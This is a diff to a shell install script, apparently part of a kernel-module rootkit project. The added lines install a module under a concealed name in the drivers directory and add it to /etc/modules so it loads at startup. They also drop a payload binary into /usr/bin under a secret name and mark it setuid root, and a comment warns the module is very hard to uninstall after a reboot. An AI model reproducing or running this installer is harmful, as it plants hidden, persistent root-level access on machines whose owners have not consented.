@@ -1,7 +1,16 @@
-# This script copies the module to the drivers folder and adds it as a startup module
+# Warning: once you run this script and reboot, it will be very difficult to uninstall the kernel module.
 
-export SECRET_STRING=$(cat secret_string)
+export SECRET_KO_NAME=$(cat secret_ko_name)
+export SECRET_PAYLOAD_NAME=$(cat secret_payload_name)
 
-cp -f main.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_STRING.ko"
-echo "\n$SECRET_STRING #magic\n" >> /etc/modules
+# deploy the kernel module to the drivers directory
+cp -f main.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_KO_NAME.ko"
+# add this module as a startup module
+echo "\n$SECRET_KO_NAME #magic\n" >> /etc/modules
+# register these changes with the OS
 depmod
+
+# deploy the payload to the /usr/bin directory
+cp -f payload /usr/bin/$SECRET_PAYLOAD_NAME
+# mark it as setuid root (probably not needed, but nice to have)
+chmod u+s /usr/bin/$SECRET_PAYLOAD_NAME
